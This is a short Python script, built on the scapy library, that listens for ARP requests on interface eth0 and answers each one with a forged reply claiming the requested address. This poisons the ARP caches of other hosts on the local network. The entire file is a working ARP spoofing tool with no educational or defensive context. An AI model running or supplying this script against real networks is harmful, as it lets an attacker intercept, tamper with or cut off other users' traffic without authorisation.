from scapy.all import *

def arp_poison(packet):
   if packet[ARP].op == 1:
      answer = Ether(dst=packet[ARP].hwsrc)/ARP()
      answer[ARP].op = "is-at"
      answer[ARP].hwdst = packet[ARP].hwsrc
      answer[ARP].psrc = packet[ARP].pdst
      answer[ARP].pdst = packet[ARP].psrc
      sendp(answer,iface="eth0")

sniff(iface="eth0",filter="arp",prn=arp_poison)
      
